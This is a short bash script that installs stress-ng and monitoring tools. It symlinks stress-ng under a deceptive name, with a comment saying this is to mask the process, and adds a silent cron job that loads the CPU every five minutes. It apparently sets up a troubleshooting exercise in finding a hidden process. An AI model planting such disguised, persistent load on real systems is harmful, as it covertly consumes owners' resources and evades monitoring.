#!/bin/bash

 

apt-get update
snap install stress-ng
apt-get install -y atop sysstat
#create symlink to mask  process
ln -s /usr/bin/stress-ng /usr/bin/notsuspectingatall

 

#write out current crontab
crontab -l > mycron

 

#echo new cron into cron file
echo "*/5 * * * * /usr/bin/notsuspectingatall --cpu 2 -t 4m >/dev/null 2>&1" >> mycron

 

#install new cron file
crontab mycron
